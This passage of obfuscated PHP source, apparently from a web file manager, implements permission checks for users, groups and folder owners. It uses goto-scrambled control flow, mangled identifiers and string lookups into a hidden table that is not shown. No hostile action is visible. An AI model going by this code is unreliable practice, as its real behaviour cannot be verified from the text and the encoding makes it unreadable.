($CÃ‘¬º©¹[$AİÔÀ´½ïî[410]] > 0) { $e™³Î˜¿ÉÒ[] = $bø±µÈ˜Ï . $AİÔÀ´½ïî[33]; } } $eğÒ®‰ìØ = array(); goto bÂÓ½º«›Ö; eÇ¸Ñù×ô: foreach ($DìˆË¬ë¤Ñ as $eÅø†¶½¢Ï) { if ($eÅø†¶½¢Ï[$AİÔÀ´½ïî[409]] == 0 && $eÅø†¶½¢Ï[$AİÔÀ´½ïî[1672]] == $AİÔÀ´½ïî[96]) { $cˆ´…‹ËÍ[] = $eÅø†¶½¢Ï[$AİÔÀ´½ïî[397]]; } } $d‡‘‹Ÿô±½ = $this->userGroupParents($FìËö‘Ğ); $Aé¿í£×£ = array($AİÔÀ´½ïî[407] => SourceModel::TYPE_USER, $AİÔÀ´½ïî[487] => $FìËö‘Ğ); goto aé„ß‘ˆÚá; E¬â†ç”³‰: if (isset($fÃùë‹óßä[$FìËö‘Ğ])) { return $fÃùë‹óßä[$FìËö‘Ğ]; } $DìˆË¬ë¤Ñ = Model($AİÔÀ´½ïî[1837])->listData(); $cˆ´…‹ËÍ = array(); goto eÇ¸Ñù×ô; b“ÂĞ‰Íö: $e¡Ö‹¹›–œ = array(); $dÓ¯ÃáÂó® = array(); $b…Â…‹–Ó­ = array(); goto e°ÎøùÔÊ; cÅ×‘•†‹: $AİÔÀ´½ïî =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $fÃùë‹óßä = array(); $FìËö‘Ğ = $FìËö‘Ğ ? $FìËö‘Ğ : USER_ID; goto E¬â†ç”³‰; B©’…ÜÓ“ó: $F¨í¤©å–Ş = array($AİÔÀ´½ïî[1830] => $eğÒ®‰ìØ, $AİÔÀ´½ïî[1831] => $e¡Ö‹¹›–œ); $fÃùë‹óßä[$FìËö‘Ğ] = $F¨í¤©å–Ş; return $F¨í¤©å–Ş; goto dŸŠ¤‚î‘Ã; Dëì‰“Á¿Ú: foreach ($Dñ¥šŠ›¼ as $d‡Û¼¥ÜŠì) { $a‚åù‘Éó´ = $eš÷Êø°×ˆ->getInfo($d‡Û¼¥ÜŠì); $eğÒ®‰ìØ[] = $a‚åù‘Éó´[$AİÔÀ´½ïî[94]][$AİÔÀ´½ïî[399]]; $b…Â…‹–Ó­[$d‡Û¼¥ÜŠì] = $a‚åù‘Éó´[$AİÔÀ´½ïî[94]][$AİÔÀ´½ïî[399]]; $eñ¿Èô¥Ûœ[$d‡Û¼¥ÜŠì] = $C£¤¢å…¤->parentLevelArray($a‚åù‘Éó´[$AİÔÀ´½ïî[490]]); } foreach ($e¡Ö‹¹›–œ as $A¦×ŞÒ½ğŞ => $dà¬¿ˆÓœ­) { $aŒ¢œß¬„ = $dÓ¯ÃáÂó®[$A¦×ŞÒ½ğŞ]; if (!$aŒ¢œß¬„ || !$b…Â…‹–Ó­[$aŒ¢œß¬„]) { continue; } $bóÚ¯õÒÎÅ = array(); foreach ($eñ¿Èô¥Ûœ[$aŒ¢œß¬„] as $d‡Û¼¥ÜŠì) { $bóÚ¯õÒÎÅ[] = $b…Â…‹–Ó­[$d‡Û¼¥ÜŠì]; } $e¡Ö‹¹›–œ[$A¦×ŞÒ½ğŞ] = array_merge($bóÚ¯õÒÎÅ, $dà¬¿ˆÓœ­); } $eğÒ®‰ìØ = array_values(array_unique($eğÒ®‰ìØ)); goto B©’…ÜÓ“ó; e°ÎøùÔÊ: $eñ¿Èô¥Ûœ = array(); if ($e™³Î˜¿ÉÒ) { $Bå¢Â¾œ‚ñ = $C£¤¢å…¤->where(array($AİÔÀ´½ïî[399] => array($AİÔÀ´½ïî[414], $e™³Î˜¿ÉÒ)))->select(); foreach ($Bå¢Â¾œ‚ñ as $DôÉŠ×ã•ù) { $CğÃ‘¿¯ÄÒ = $C£¤¢å…¤->parentLevelArray($DôÉŠ×ã•ù[$AİÔÀ´½ïî[490]]); $eğÒ®‰ìØ = array_merge($eğÒ®‰ìØ, $CğÃ‘¿¯ÄÒ); $Dñ¥šŠ›¼[] = $DôÉŠ×ã•ù[$AİÔÀ´½ïî[487]]; $e¡Ö‹¹›–œ[$DôÉŠ×ã•ù[$AİÔÀ´½ïî[399]]] = $CğÃ‘¿¯ÄÒ; $dÓ¯ÃáÂó®[$DôÉŠ×ã•ù[$AİÔÀ´½ïî[399]]] = $DôÉŠ×ã•ù[$AİÔÀ´½ïî[487]]; } } $Dñ¥šŠ›¼ = array_values(array_unique($Dñ¥šŠ›¼)); goto fæ‡á÷íÈÓ; bÂÓ½º«›Ö: $Dñ¥šŠ›¼ = $d‡‘‹Ÿô±½; $C£¤¢å…¤ = Model($AİÔÀ´½ïî[1164]); $eš÷Êø°×ˆ = Model($AİÔÀ´½ïî[489]); goto b“ÂĞ‰Íö; fæ‡á÷íÈÓ: $a‚¶“ïÈ = $Dñ¥šŠ›¼; foreach ($a‚¶“ïÈ as $d‡Û¼¥ÜŠì) { $a‚åù‘Éó´ = $eš÷Êø°×ˆ->getInfo($d‡Û¼¥ÜŠì); $CğÃ‘¿¯ÄÒ = $C£¤¢å…¤->parentLevelArray($a‚åù‘Éó´[$AİÔÀ´½ïî[490]]); $Dñ¥šŠ›¼ = array_merge($Dñ¥šŠ›¼, $CğÃ‘¿¯ÄÒ); } $Dñ¥šŠ›¼ = array_values(array_unique($Dñ¥šŠ›¼)); goto Dëì‰“Á¿Ú; dŸŠ¤‚î‘Ã: } private function makeSourceAuth($aÅäîÈ©á, $fµõŒºßÉĞ, $DÊî†¨È´ò = false) { goto c¡¸ñ¢¹³; c¡¸ñ¢¹³: $Dªê’ØˆŒŠ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Då‚²Öé©ò = $Dªê’ØˆŒŠ[96]; $EŸÆ¯÷¼‚ = $aÅäîÈ©á[$Dªê’ØˆŒŠ[487]]; goto d¦¨‹ˆ¢†ä; FøÕ­ÙœÜ: $Dß…êÇ”¾ = Model($Dªê’ØˆŒŠ[1164])->parentLevelArray($aÅäîÈ©á[$Dªê’ØˆŒŠ[490]]); $Dß…êÇ”¾ = array_merge(array($aÅäîÈ©á[$Dªê’ØˆŒŠ[399]]), array_reverse($Dß…êÇ”¾)); $A÷‹¤Û¾‰ì = !1; goto B¬èèÌµ‹; d¦¨‹ˆ¢†ä: $DœœË„Â® = $aÅäîÈ©á[$Dªê’ØˆŒŠ[407]] == SourceModel::TYPE_GROUP; $aåÆà ¬–“ = $DœœË„Â® ? $this->groupRootAuth($EŸÆ¯÷¼‚, $DÊî†¨È´ò) : !1; if ($aåÆà ¬–“ && Model($Dªê’ØˆŒŠ[1818])->authCheckAction($aåÆà ¬–“[$Dªê’ØˆŒŠ[409]], $Dªê’ØˆŒŠ[1670])) { return $this->groupAuthInfo($aåÆà ¬–“, $EŸÆ¯÷¼‚); } goto FøÕ­ÙœÜ; B¬èèÌµ‹: foreach ($Dß…êÇ”¾ as $c«ò»·µÎ—) { if (!isset($fµõŒºßÉĞ[$c«ò»·µÎ—])) { continue; } $b¸ôšÓŠ× = $this->authMake($fµõŒºßÉĞ[$c«ò»·µÎ—], $DÊî†¨È´ò); if ($b¸ôšÓŠ×[$Dªê’ØˆŒŠ[449]]) { $A÷‹¤Û¾‰ì = $b¸ôšÓŠ×; break; } } if (!$DœœË„Â®) { return $A÷‹¤Û¾‰ì; } if (!$A÷‹¤Û¾‰ì && $aåÆà ¬–“) { $A÷‹¤Û¾‰ì = $this->groupAuthInfo($aåÆà ¬–“, $EŸÆ¯÷¼‚); } goto d³Ô¼¤ˆÍ; d³Ô¼¤ˆÍ: if (!$A÷‹¤Û¾‰ì) { $FšÃŠ†Œ¦ƒ = Model($Dªê’ØˆŒŠ[489])->getInfo($EŸÆ¯÷¼‚); $AôƒÇ£¤·£ = explode($Dªê’ØˆŒŠ[47], trim($FšÃŠ†Œ¦ƒ[$Dªê’ØˆŒŠ[490]], $Dªê’ØˆŒŠ[47])); $AôƒÇ£¤·£ = array_reverse($AôƒÇ£¤·£); foreach ($AôƒÇ£¤·£ as $D‚ËòÊ‹º•) { if ($D‚ËòÊ‹º• == $Dªê’ØˆŒŠ[500] || $D‚ËòÊ‹º• == $Då‚²Öé©ò) { continue; } $fôïì–°ô† = $this->groupRootAuth($D‚ËòÊ‹º•, $DÊî†¨È´ò); if (!$fôïì–°ô†) { continue; } $A÷‹¤Û¾‰ì = $this->groupAuthInfo($fôïì–°ô†, $D‚ËòÊ‹º•); break; } } if (!$A÷‹¤Û¾‰ì || $A÷‹¤Û¾‰ì[$Dªê’ØˆŒŠ[410]] <= 0) { $EÊ‚…š×æ = $this->authDeepCheck($aÅäîÈ©á[$Dªê’ØˆŒŠ[399]], $DÊî†¨È´ò); if ($EÊ‚…š×æ) { $A÷‹¤Û¾‰ì = $EÊ‚…š×æ; } } return $A÷‹¤Û¾‰ì; goto e¹éÛªŒ¨; e¹éÛªŒ¨: } private function userIsRoot($DÜ®µäÍ½Ì = false) { $DŒƒâÙ×Å =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$DÜ®µäÍ½Ì && _get($GLOBALS, $DŒƒâÙ×Å[488])) { return !0; } $D›†Öóíôå = Model($DŒƒâÙ×Å[510])->getInfo($DÜ®µäÍ½Ì); $Bä‘© «Œ¯ = Model($DŒƒâÙ×Å[1839])->listData($D›†Öóíôå[$DŒƒâÙ×Å[1372]]); if ($Bä‘© «Œ¯ && $Bä‘© «Œ¯[$DŒƒâÙ×Å[1242]][$DŒƒâÙ×Å[1840]] == 1) { return !0; } return !1; } private function sourceAuthInfo($CÛƒ«…ùƒ‡) { goto ešÜ°İÉù‹; ešÜ°İÉù‹: $f‚“óÜ¤¨ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FŒÀŠ³½‡© = Model($f‚“óÜ¤¨ñ[1164]); $c‡’ŸÚËÂ = $FŒÀŠ³½‡©->sourceInfo($CÛƒ«…ùƒ‡); goto DŒø•Š Ó; e„‚¹ÊÁÓÍ: $Aâ»°È´­ = $FŒÀŠ³½‡©->_listAppendPath($Aâ»°È´­); $c‡’ŸÚËÂ = $Aâ»°È´­[0]; $FªÅÚÛª = $c‡’ŸÚËÂ[$f‚“óÜ¤¨ñ[498]]; goto B—Š²ó·‚™; B—Š²ó·‚™: if (isset($c‡’ŸÚËÂ[$f‚“óÜ¤¨ñ[495]])) { $c‚÷Ô™Ù† = explode($f‚“óÜ¤¨ñ[8], trim($c‡’ŸÚËÂ[$f‚“óÜ¤¨ñ[498]], $f‚“óÜ¤¨ñ[8])); array_shift($c‚÷Ô™Ù†); $FªÅÚÛª = $c‡’ŸÚËÂ[$f‚“óÜ¤¨ñ[493]] . $f‚“óÜ¤¨ñ[1841] . implode($f‚“óÜ¤¨ñ[8], $c‚÷Ô™Ù†); } return array($f‚“óÜ¤¨ñ[416] => $c‡’ŸÚËÂ[$f‚“óÜ¤¨ñ[28]], $f‚“óÜ¤¨ñ[85] => KodIO::make($c‡’ŸÚËÂ[$f‚“óÜ¤¨ñ[399]]), $f‚“óÜ¤¨ñ[1842] => $FªÅÚÛª); goto aò¯¸×¸‰; DŒø•Š Ó: if (!$c‡’ŸÚËÂ) { return !1; } $FŒÀŠ³½‡©->groupPathDisplay($c‡’ŸÚËÂ); $Aâ»°È´­ = array($c‡’ŸÚËÂ); goto e„‚¹ÊÁÓÍ; aò¯¸×¸‰: } private function groupAuthInfo($fÔ­´ùè£¸, $Cå™ÀåÀ‹Œ) { $DÎ›´ß÷¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¬öËƒİ×Æ = Model($DÎ›´ß÷¹[489])->getInfo($Cå™ÀåÀ‹Œ); return array($DÎ›´ß÷¹[1843] => intval($fÔ­´ùè£¸[$DÎ›´ß÷¹[409]]), $DÎ›´ß÷¹[1827] => $fÔ­´ùè£¸, $DÎ›´ß÷¹[1844] => LNG($DÎ›´ß÷¹[1845]), $DÎ›´ß÷¹[1836] => array($DÎ›´ß÷¹[416] => $B¬öËƒİ×Æ[$DÎ›´ß÷¹[28]], $DÎ›´ß÷¹[85] => KodIO::make($B¬öËƒİ×Æ[$DÎ›´ß÷¹[94]][$DÎ›´ß÷¹[399]]), $DÎ›´ß÷¹[1842] => $B¬öËƒİ×Æ[$DÎ›´ß÷¹[494]])); } protected function groupRootAuth($E«¦Š¾‘†, $E»­ø±Óâñ = false) { goto cêÅÆ”‘Ÿì; cêÅÆ”‘Ÿì: $BÀˆöù¦‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E»­ø±Óâñ = $E»­ø±Óâñ ? $E»­ø±Óâñ : USER_ID; $c”§İ±àÕŞ = $E»­ø±Óâñ . $BÀˆöù¦‘[1846] . $E«¦Š¾‘†; goto dÏ„öˆôÛ˜; dÏ„öˆôÛ˜: static $ağÆ§¸Éâ¶ = array(); if (isset($ağÆ§¸Éâ¶[$c”§İ±àÕŞ])) { return $ağÆ§¸Éâ¶[$c”§İ±àÕŞ]; } $E‹ğÉÂ·ùß = Model($BÀˆöù¦‘[489])->getInfo($E«¦Š¾‘†); goto Fœ”Å”š¸; Fœ”Å”š¸: $fõİ ï–ï = $this->userGroupList($E»­ø±Óâñ); $BŸ²ô‡ó„Î = isset($fõİ ï–ï[$E«¦Š¾‘†]) ? $fõİ ï–ï[$E«¦Š¾‘†][$BÀˆöù¦‘[409]] : !1; if ($BŸ²ô‡ó„Î && Model($BÀˆöù¦‘[1818])->authCheckAction($BŸ²ô‡ó„Î[$BÀˆöù¦‘[409]], $BÀˆöù¦‘[1670])) { $ağÆ§¸Éâ¶[$c”§İ±àÕŞ] = $BŸ²ô‡ó„Î; return $BŸ²ô‡ó„Î; } goto d±İÚ¡Ÿ‚; c£Ê‹ØÏ—: $ağÆ§¸Éâ¶[$c”§İ±àÕŞ] = $E¤ç‘·¤ ? $E¤ç‘·¤ : $BŸ²ô‡ó„Î; return $ağÆ§¸Éâ¶[$c”§İ±àÕŞ]; goto eæÑ¢±‚Ê; d±İÚ¡Ÿ‚: $Dçä«½³ó = $this->sourceAuthSelect($E‹ğÉÂ·ùß[$BÀˆöù¦‘[94]][$BÀˆöù¦‘[399]]); $dòé­ˆ±ß™ = $Dçä«½³ó ? $this->authMake($Dçä«½³ó, $E»­ø±Óâñ) : !1; $E¤ç‘·¤ = $dòé­ˆ±ß™ ? $dòé­ˆ±ß™[$BÀˆöù¦‘[449]] : !1; goto c£Ê‹ØÏ—; eæÑ¢±‚Ê: } public function authOwnerApply($cŸßâ‰¡ÆÄ) { goto fÉÄ†È«İ‚; BÒ¸ØŠß: $cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[409]][$A¦ ºóíå¬[1849]] = Model($A¦ ºóíå¬[506])->userListInfo($A‡Á“¯»); return $cŸßâ‰¡ÆÄ; goto AšåÕ®´©¹; f³©Øİßİ: if (count($A‡Á“¯») == 0) { $A‡Á“¯» = $this->authFolderOwnerGroup($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[487]]); } $A‡Á“¯» = array_unique($A‡Á“¯»); if (AuthModel::authCheckRoot($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[409]][$A¦ ºóíå¬[410]])) { $A‡Á“¯»[] = USER_ID; } goto BÒ¸ØŠß; aÆÎÆªÑ¼: $E’Ş¿¬§ = array(); $A‡Á“¯» = array(); foreach ($dÌÈÊêˆÆ as $bù ã¡ ½ => $C¦¼Ô×¦“¼) { $F¾Šé«óìê = $this->authFolderOwnerUser($C¦¼Ô×¦“¼); $E’Ş¿¬§[$bù ã¡ ½] = $F¾Šé«óìê; $A‡Á“¯» = array_merge($A‡Á“¯», $F¾Šé«óìê[$A¦ ºóíå¬[566]]); if ($F¾Šé«óìê[$A¦ ºóíå¬[1848]]) { break; } } goto f³©Øİßİ; fÉÄ†È«İ‚: $A¦ ºóíå¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[409]]) || isset($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[1847]]) && $cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[1847]]) { return $cŸßâ‰¡ÆÄ; } if (AuthModel::authCheckRoot($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[409]][$A¦ ºóíå¬[410]])) { return $cŸßâ‰¡ÆÄ; } goto Eóù‚¥á; Eóù‚¥á: $eÔëãÈØ· = Model($A¦ ºóíå¬[1164])->parentLevelArray($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[490]]); $eÔëãÈØ· = array_merge(array($cŸßâ‰¡ÆÄ[$A¦ ºóíå¬[399]]), array_reverse($eÔëãÈØ·)); $dÌÈÊêˆÆ = $this->sourceAuthSelect($eÔëãÈØ·); goto aÆÎÆªÑ¼; AšåÕ®´©¹: } private function authFolderOwnerGroup($fæ­Ù¬¶“ƒ) { $a¤ÙÎÜ¤ĞÀ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÁ§·°ÏÀ = Model($a¤ÙÎÜ¤ĞÀ[1732])->where(array($a¤ÙÎÜ¤ĞÀ[1650] => $fæ­Ù¬¶“ƒ))->select(); $fé„‚îÌóŞ = array(); if (!$cÁ§·°ÏÀ) { return $fé„‚îÌóŞ; } foreach ($cÁ§·°ÏÀ as $DöéâÂšæ†) { $eÂİ’‚ ¼ = $this->authInfo($DöéâÂšæ†); if (AuthModel::authCheckRoot($eÂİ’‚ ¼[$a¤ÙÎÜ¤ĞÀ[409]])) { $fé„‚îÌóŞ[] = $DöéâÂšæ†[$a¤ÙÎÜ¤ĞÀ[1487]]; } } return $fé„‚îÌóŞ; } private function authFolderOwnerUser($DÜÂ’Œ¯Èñ) { $f²åÏ†×çò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E†¾æáÓöâ = array(); $FÌƒËƒÅœø = !1; foreach ($DÜÂ’Œ¯Èñ as $Cè‡ÖŠ®š) { $b©íœ—êè¹ = $this->authInfo($Cè‡ÖŠ®š); if ($Cè‡ÖŠ®š[$f²åÏ†×çò[487]] == $f²åÏ†×çò[500]) { $FÌƒËƒÅœø = !0; } if ($Cè‡ÖŠ®š[$f²åÏ†×çò[407]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($b©íœ—êè¹[$f²åÏ†×çò[409]])) { $E†¾æáÓöâ[] = $Cè‡ÖŠ®š[$f²åÏ†×çò[487]]; } } } return array($f²åÏ†×çò[566] => $E†¾æáÓöâ, $f²åÏ†×çò[1848] => $FÌƒËƒÅœø); } public function authMake($Bİß–Ë­Éô, $Aöº…´Ù Ö = false) { $BğâÂËÄ˜à =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FŒ•¹ª× = $this->authArrayCheck($Bİß–Ë­Éô, $Aöº…´Ù Ö); if ($FŒ•¹ª×[$BğâÂËÄ˜à[1850]]) { $FŒ•¹ª×[$BğâÂËÄ˜à[1850]] = $this->sourceAuthInfo($FŒ•¹ª×[$BğâÂËÄ˜à[1850]]); } return $FŒ•¹ª×; } public function authArrayCheck($e‡Á¸¬¥×, $bîá‡¬ø… = false) { goto e‡¯½êõï¦; Cï¶°‡Ïã¿: $d›á³¥œÍß = 0; $c÷¡Ÿ† „Æ = 0; $A¬é„™Ç¯ç = array($CŠ˜â³è»[399] => 0); goto EÍİˆÒÍÉ; f¾ª…ÎÖ¹Ç: $Cµ¹˜¾¦ê = 1000; $e‡£óˆÒù¨ = 0; $BÇ‹ÌùŒİ = 0; goto Cï¶°‡Ïã¿; b‹Ş²Ì¦å: return $dŒ„ã‡¬£É; goto Bøœ¸ß¤æê; f•¿âæöÖæ: $cÕ«šÖî•‹ = 0; $CÈÔ‘æ¦¹¦ = 0; $Bô–æİÒ÷ = 0; goto E÷¸’ÛùÃœ; EÍİˆÒÍÉ: foreach ($e‡Á¸¬¥× as $A¬é„™Ç¯ç) { $A¨È‚¬ª» = $this->authInfo($A¬é„™Ç¯ç); if (!$A¨È‚¬ª») { continue; } $Fïß‡œÙÄò = $A¬é„™Ç¯ç[$CŠ˜â³è»[487]]; $E†ÎÛÆĞä£ = intval($A¨È‚¬ª»[$CŠ˜â³è»[409]]); if ($A¬é„™Ç¯ç[$CŠ˜â³è»[407]] == SourceModel::TYPE_USER && $Fïß‡œÙÄò == $bîá‡¬ø…) { $cÕ«šÖî•‹ = !0; $Bô–æİÒ÷ = $A¨È‚¬ª»; $CÈÔ‘æ¦¹¦ = $E†ÎÛÆĞä£; } else { if ($A¬é„™Ç¯ç[$CŠ˜â³è»[407]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Fïß‡œÙÄò, $bîá‡¬ø…)) { $BæŒ‘’àÇ = !0; $D˜ŒÊæØ¢Œ = $this->groupStepToUserGroup($Fïß‡œÙÄò, $bîá‡¬ø…); if ($D˜ŒÊæØ¢Œ < $Cµ¹˜¾¦ê) { $Cµ¹˜¾¦ê = $D˜ŒÊæØ¢Œ; $cÇ‹¤„ÀŠì = $E†ÎÛÆĞä£; $dè„£òØçÄ = $A¨È‚¬ª»; $e‡£óˆÒù¨ = $Fïß‡œÙÄò; } if ($D˜ŒÊæØ¢Œ == $Cµ¹˜¾¦ê && $E†ÎÛÆĞä£ >= $cÇ‹¤„ÀŠì) { $cÇ‹¤„ÀŠì = $E†ÎÛÆĞä£; $dè„£òØçÄ = $A¨È‚¬ª»; $e‡£óˆÒù¨ = $Fïß‡œÙÄò; } } else { if ($Fïß‡œÙÄò == $CŠ˜â³è»[500]) { $BÇ‹ÌùŒİ = !0; $c÷¡Ÿ† „Æ = $A¨È‚¬ª»; $d›á³¥œÍß = $E†ÎÛÆĞä£; } } } } if ($cÕ«šÖî•‹) { $DÃÕæ“¯Ô‰ = $CÈÔ‘æ¦¹¦; $A¨È‚¬ª» = $Bô–æİÒ÷; $cõĞ½‡ = LNG($CŠ˜â³è»[1851]); } else { if ($BæŒ‘’àÇ) { $DÃÕæ“¯Ô‰ = $cÇ‹¤„ÀŠì; $A¨È‚¬ª» = $dè„£òØçÄ; $fÕÊøº½‚ˆ = Model($CŠ˜â³è»[489])->getInfo($e‡£óˆÒù¨); $cõĞ½‡ = $CŠ˜â³è»[169] . $fÕÊøº½‚ˆ[$CŠ˜â³è»[494]] . $CŠ˜â³è»[1852] . LNG($CŠ˜â³è»[1853]); } else { if ($BÇ‹ÌùŒİ) { $DÃÕæ“¯Ô‰ = $d›á³¥œÍß; $A¨È‚¬ª» = $c÷¡Ÿ† „Æ; $cõĞ½‡ = LNG($CŠ˜â³è»[1824]); } else { $DÃÕæ“¯Ô‰ = 0; $A¨È‚¬ª» = !1; $cõĞ½‡ = $CŠ˜â³è»[33]; } } } $dŒ„ã‡¬£É = array($CŠ˜â³è»[1843] => intval($DÃÕæ“¯Ô‰), $CŠ˜â³è»[1827] => $A¨È‚¬ª», $CŠ˜â³è»[1844] => $cõĞ½‡, $CŠ˜â³è»[1836] => $A¬é„™Ç¯ç[$CŠ˜â³è»[399]]); goto b‹Ş²Ì¦å; E÷¸’ÛùÃœ: $BæŒ‘’àÇ = 0; $cÇ‹¤„ÀŠì = 0; $dè„£òØçÄ = 0; goto f¾ª…ÎÖ¹Ç; e‡¯½êõï¦: $CŠ˜â³è» =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$e‡Á¸¬¥×) { return array($CŠ˜â³è»[410] => 0, $CŠ˜â³è»[449] => !1); } $bîá‡¬ø… = $bîá‡¬ø… ? $bîá‡¬ø… : USER_ID; goto f•¿âæöÖæ; Bøœ¸ß¤æê: } private function groupContainUser($Eç¤¨Ğ¹áÒ, $D‹¥Ì²Ãøò = false) { return in_array($Eç¤¨Ğ¹áÒ, $this->userGroupParents($D‹¥Ì²Ãøò)); } private function groupStepToUserGroup($aÓ™Å„ß², $aè¹Ë¥®æÁ = false) { goto BÆùº¼¢É; b¸ğä‡é«: return $cæ„ î¡ª; goto E‚¢¸†¯ô÷; BÆùº¼¢É: $c£™µ¹âñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d»˜ÉÂÎïÍ = $this->userGroupList($aè¹Ë¥®æÁ); $cæ„ î¡ª = 1000; goto Aà‰ùÏòœ; Aà‰ùÏòœ: $eç±àØï í = $GLOBALS[$c£™µ¹âñ[6]][$c£™µ¹âñ[97]][$c£™µ¹âñ[1743]] == 1; $EÖ™¸²‚Õ÷ = $eç±àØï í ? 3 : 2; foreach ($d»˜ÉÂÎïÍ as $eØ­»¬ºŞ”) { if ($eØ­»¬ºŞ”[$c£™µ¹âñ[1650]] == $aÓ™Å„ß²) { return 0; } $b¬Äˆ½×É¼ = explode($c£™µ¹âñ[47], trim($eØ­»¬ºŞ”[$c£™µ¹âñ[490]], $c£™µ¹âñ[47])); if ($b¬Äˆ½×É¼[0] == $c£™µ¹âñ[500] && count($b¬Äˆ½×É¼) > $EÖ™¸²‚Õ÷) { $E°Óš™ŠÎ = array_reverse(array_slice($b¬Äˆ½×É¼, $EÖ™¸²‚Õ÷)); $C¥Öä”Ç¼Â = array_search($aÓ™Å„ß², $E°Óš™ŠÎ); if ($C¥Öä”Ç¼Â !== !1 && $C¥Öä”Ç¼Â + 1 <= $cæ„ î¡ª) { $cæ„ î¡ª = $C¥Öä”Ç¼Â + 1; } } } goto b¸ğä‡é«; E‚¢¸†¯ô÷: } private function userGroupList($cÂÂŸ·‚ˆË = false) { $DÅ©—ñ†Ü¸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $bö¹µ˜® = array(); if (isset($bö¹µ˜®[$cÂÂŸ·‚ˆË])) { return $bö¹µ˜®[$cÂÂŸ·‚ˆË]; } $c¡çÃÑ’ = Model($DÅ©—ñ†Ü¸[510])->getInfo($cÂÂŸ·‚ˆË); $bö¹µ˜®[$cÂÂŸ·‚ˆË] = array_to_keyvalue($c¡çÃÑ’[$DÅ©—ñ†Ü¸[1825]], $DÅ©—ñ†Ü¸[1650]); return $bö¹µ˜®[$cÂÂŸ·‚ˆË]; } public function userGroupParents($e•º†çíÄë) { goto EŠø«ø¤÷´; b–Å˜îÃÖí: $B„¾ÅĞŒŠ…[$e•º†çíÄë] = array_unique($e—…ƒ‹Ù‡); return $B„¾ÅĞŒŠ…[$e•º†çíÄë]; goto D‡ªÄù©Ñ; cÊÉŠ‘Š½: if (isset($B„¾ÅĞŒŠ…[$e•º†çíÄë])) { return $B„¾ÅĞŒŠ…[$e•º†çíÄë]; } $aï§ßõóÜ = $this->userGroupList($e•º†çíÄë); $e—…ƒ‹Ù‡ = array(); goto FÄôíâËê; EŠø«ø¤÷´: $F»òŸ‰¢Ô„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $B„¾ÅĞŒŠ… = array(); $e•º†çíÄë = $e•º†çíÄë ? $e•º†çíÄë : USER_ID; goto cÊÉŠ‘Š½; FÄôíâËê: $c™âò™î˜ = $GLOBALS[$F»òŸ‰¢Ô„[6]][$F»òŸ‰¢Ô„[97]][$F»òŸ‰¢Ô„[1743]] == 1; $a²½Ş¦Ì÷‹ = $c™âò™î˜ ? 3 : 2; foreach ($aï§ßõóÜ as $b¦É¦ŠÊ) { $bš•ïôøèÜ = array($b¦É¦ŠÊ[$F»òŸ‰¢Ô„[1650]]); $döäÔ©Ø½† = explode($F»òŸ‰¢Ô„[47], trim($b¦É¦ŠÊ[$F»òŸ‰¢Ô„[490]], $F»òŸ‰¢Ô„[47])); if ($döäÔ©Ø½†[0] == $F»òŸ‰¢Ô„[500] && count($döäÔ©Ø½†) > $a²½Ş¦Ì÷‹) { $d¦ö–¬‘ä¬ = array_slice($döäÔ©Ø½†, $a²½Ş¦Ì÷‹); $bš•ïôøèÜ = array_merge($bš•ïôøèÜ, array_reverse($d¦ö–¬‘ä¬)); } $e—…ƒ‹Ù‡ = array_merge($e—…ƒ‹Ù‡, $bš•ïôøèÜ); } goto b–Å˜îÃÖí; D‡ªÄù©Ñ: } public function authTargetInfoMake($cçˆ®½­ëŒ) { goto c¸Ú—ÖÄÜê; c¸Ú—ÖÄÜê: $E¢í”Éè…Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FµÖäƒƒ°™ = array(); $bÒ§ËÃ¤À¨ = array(); goto C§µñ‰ä”; E‰ÒÃØ¡œ: return array($E¢í”Éè…Â[1855] => $FµÖäƒƒ°™, $E¢í”Éè…Â[1856] => $bÒ§ËÃ¤À¨); goto F“°²˜×ŸŞ; C§µñ‰ä”: foreach ($cçˆ®½­ëŒ as $e†ÜÜß²É) { if ($e†ÜÜß²É[$E¢í”Éè…Â[407]] == SourceModel::TYPE_USER) { $FµÖäƒƒ°™[] = intval($e†ÜÜß²É[$E¢í”Éè…Â[487]]); } else { if ($e†ÜÜß²É[$E¢í”Éè…Â[407]] == SourceModel::TYPE_GROUP) { $bÒ§ËÃ¤À¨[] = intval($e†ÜÜß²É[$E¢í”Éè…Â[487]]); } } } if ($FµÖäƒƒ°™) { $FµÖäƒƒ°™ = Model($E¢í”Éè…Â[506])->userListInfo($FµÖäƒƒ°™); } if ($bÒ§ËÃ¤À¨) { $aèò¾ÖÄ®‰ = array($E¢í”Éè…Â[1729] => array($E¢í”Éè…Â[414], $bÒ§ËÃ¤À¨)); $bÒ§ËÃ¤À¨ = Model($E¢í”Éè…Â[489])->field($E¢í”Éè…Â[1854])->where($aèò¾ÖÄ®‰)->select(); $bÒ§ËÃ¤À¨ = array_to_keyvalue($bÒ§ËÃ¤À¨, $E¢í”Éè…Â[1650]); } goto E‰ÒÃØ¡œ; F“°²˜×ŸŞ: } public function authInfo($eŒì±è¹¬) { $a«‰âÚ…ë =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($eŒì±è¹¬[$a«‰âÚ…ë[1746]]) { $a¶÷¸Ä½´µ = Model($a«‰âÚ…ë[1818])->listData($eŒì±è¹¬[$a«‰âÚ…ë[1746]]); if 